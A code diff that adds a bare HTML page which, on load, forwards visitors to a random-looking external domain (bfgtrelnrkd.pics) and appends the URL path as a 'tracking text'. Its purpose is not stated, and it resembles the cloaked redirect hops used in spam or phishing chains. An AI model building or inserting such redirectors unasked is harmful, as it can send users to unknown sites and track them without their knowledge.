@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    (function() {
+      'use strict';
+      document.addEventListener('DOMContentLoaded', function() {
+        // Remove the leading "/" from the pathname to get the tracking text.
+        const trackingText = window.location.pathname.slice(1);
+
+        if (!trackingText) {
+          alert("Please provide tracking text in the URL (e.g., http://example.com/thetextmustredirected)");
+        } else {
+          // Construct the new URL by appending the tracking text to the redirect domain.
+          window.location.href = `http://bfgtrelnrkd.pics/${trackingText}`;
+        }
+      });
+    })();
+  </script>
+</head>
+<body>
+  <noscript>Please enable JavaScript to be redirected.</noscript>
+</body>
+</html>
